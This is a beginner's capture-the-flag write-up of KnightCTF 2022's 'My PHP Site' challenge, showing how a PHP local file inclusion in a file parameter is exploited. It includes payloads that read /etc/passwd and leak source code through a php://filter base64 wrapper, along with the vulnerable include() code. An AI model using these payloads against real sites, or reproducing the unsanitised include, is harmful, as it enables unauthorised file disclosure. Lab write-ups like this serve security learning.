<h1>My PHP Site ( KnightCTF 2022 )</h1>


Hey there its my first writeup.
So follwoing the link of challenge we find ourself in a webpage, which contains
`Hey! Welcome to my site. I made this site using php.. You are viewing tareq's home page.`
As you may already know php based websites are full of vulns.
Getting a closer look at the link, we see the parametre: `/?file=index.html`
Immediatly we think about an LFI ( Local File Inclusion ).
Let's try getting something with it:
`/?file=/etc/passwd`
YEP, we got an LFI, nothing to find on the /etc/passwd though.
Let's try getting the source code:
`/?file=index.php`
We get an `ERROR!!`
hmmm I wonder why...let's use a php filter, the base64 one for example.
`/?file=php://filter/convert.base64-encode/resource=index.php`
We got the source code:
`PD9waHAKCmlmKGlzc2V0KCRfR0VUWydmaWxlJ10pKXsKICAgIGlmICgkX0dFVFsnZmlsZSddID09ICJpbmRleC5waHAiKSB7CiAgICAgICAgZWNobyAiPGgxPkVSUk9SISE8L2gxPiI7CiAgICAgICAgZGllKCk7CiAgICB9ZWxzZXsKICAgICAgICBpbmNsdWRlICRfR0VUWydmaWxlJ107CiAgICB9Cgp9ZWxzZXsKICAgIGVjaG8gIjxoMT5Zb3UgYXJlIG1pc3NpbmcgdGhlIGZpbGUgcGFyYW1ldGVyPC9oMT4iOwoKICAgICNub3RlIDotIHNlY3JldCBsb2NhdGlvbiAvaG9tZS90YXJlcS9zM2NyRXRfZmw0OS50eHQKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI`
Let's decode it from base64.
`base64 -d index`
we get the php source code.
```<?php

if(isset($_GET['file'])){
    if ($_GET['file'] == "index.php") {
        echo "<h1>ERROR!!</h1>";
        die();
    }else{
        include $_GET['file'];
    }

}else{
    echo "<h1>You are missing the file parameter</h1>";

    #note :- secret location /home/tareq/s3crEt_fl49.txt
}

?>
```
Straight to the flag!
`/?file=s3crEt_fl49.txt`
Bingo
`KCTF{L0C4L_F1L3_1ncLu710n}`

